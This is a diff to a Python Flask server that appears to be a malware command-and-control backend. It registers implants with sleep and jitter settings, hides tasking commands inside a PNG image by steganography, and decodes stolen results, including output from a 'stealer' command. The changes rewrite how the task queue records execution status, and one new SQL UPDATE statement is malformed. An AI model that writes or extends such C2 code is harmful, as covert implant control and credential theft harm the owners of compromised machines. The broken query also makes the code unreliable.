@@ -111,7 +111,9 @@ def get_commands():
         print(f"this is the db response: {db_resp}")
         if db_resp == None:
             db_resp = {"commands": "No commands found"}
-        
+        query = "UPDATE task_queue SET status=%s WHERE id=%s"
+        tools.executeGenericVar(query, ['executing', id])
+
         img = Steganography.iio.imread("doge.png")
         Steganography.iio.imwrite("doge_encoded.png", Steganography.encode(img, json.dumps(db_resp, default=str)))
         response = send_file('doge_encoded.png', mimetype='image/png')
@@ -177,7 +179,7 @@ def register_implant():
         print(data['sleep'])
         jitter = data['jitter']
         sleep = data['sleep']
-        first_connection = last_seen = datetime.now().isoformat()
+        first_connection = last_seen = datetime.now()
         active = True
         columns = ["first_connection", "active",
                    "jitter", "sleep", "last_seen"]
@@ -209,27 +211,20 @@ def handle_response():
         file = request.files['file']
         string_rep = Steganography.decode(Steganography.iio.imread(file))
         data = json.loads(string_rep)
-        
-        for index in data: 
-            target_implant_id = index['target_implant_id']
-            task_id = index['task_id']
-            response_data = index['response_data']
-            success = index['success']
-            command = index['command']
+        target_implant_id = data['target_implant_id']
+        task_id = data['task_id']
+        response_data = data['response_data']
+        success = data['success']
+        command = data['command']
 
-            if "stealer" in command: 
-                # TODO call Wyatt's function 
-                 response_data = WyattWonderland.parsejson(response_data)
+        if "stealer" in command: 
+            # TODO call Wyatt's function 
+            response_data = WyattWonderland.parsejson(response_data)
             
-            # DUMP BACK INTO TASK_QUEUE 
-
-
-            
-
-
-
-
-
+        # DUMP BACK INTO TASK_QUEUE 
+        query = "UPDATE task_queue SET (status='executed' response_data=%s success=%s recieved_on=%s) WHERE task_id=%s"
+        time = datetime.now()
+        tools.executeGenericVar(query, [response_data, success, time, task_id])
 
         # img = iio.imread("doge.png")
         # iio.imwrite("doge_encoded.png", encode(img, "HelloWorld"))
